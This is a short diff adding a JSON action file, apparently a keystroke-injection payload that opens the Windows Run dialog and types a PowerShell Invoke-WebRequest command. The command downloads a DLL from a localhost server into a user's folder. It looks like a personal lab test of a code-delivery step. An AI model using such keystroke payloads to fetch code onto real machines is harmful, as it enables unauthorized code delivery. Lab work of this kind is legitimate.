@@ -1,0 +1,22 @@
+{
+    "actions": [
+        {
+            "type": "keystrokes",
+            "value": {
+                "type": "keybind",
+                "value": "win+r"
+            }
+        },
+        {
+            "type": "delay",
+            "value": 100
+        },
+        {
+            "type": "keystrokes",
+            "value": {
+                "type": "script",
+                "value": "Invoke-WebRequest http://localhost:8000/SimpleDll.dll -OutFile C:\\Users\\alper\\bomboclat.dll"
+            }
+        }
+    ]
+}
